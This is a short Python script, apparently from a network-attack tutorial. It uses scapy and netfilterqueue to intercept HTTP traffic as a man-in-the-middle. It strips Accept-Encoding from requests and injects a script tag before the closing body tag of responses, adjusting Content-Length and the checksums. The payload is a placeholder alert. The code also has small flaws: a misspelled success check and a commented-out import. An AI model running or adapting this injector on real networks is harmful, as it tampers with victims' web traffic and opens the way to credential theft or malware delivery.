#import netfilterqueue
import scapy.all as scpy
import re


def SetLoad(packet, load):
    packet[scpy.Raw].load = load
    if "allert('test')" in packet[scpy.Raw].load:
        print(packet[scpy.Raw].load)
        print("JS Injected Successfully")
    del packet[scpy.IP].len
    del packet[scpy.IP].chksum
    del packet[scpy.TCP].chksum
    return packet


def ProcessPack(packet):
    scpy_packet = scpy.IP(packet.get_payload())
    if scpy_packet.haslayer(scpy.Raw):
        load = scpy_packet[scpy.Raw].load

        if scpy_packet[scpy.TCP].dport == 80:
            # print "[+]Request "
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scpy_packet[scpy.TCP].sport == 80:
            # print "[+] Response "
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scpy_packet[scpy.Raw].load:
            new_packet = SetLoad(scpy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


q = netfilterqueue.NetfilterQueue()
q.bind(0, ProcessPack)
q.run()
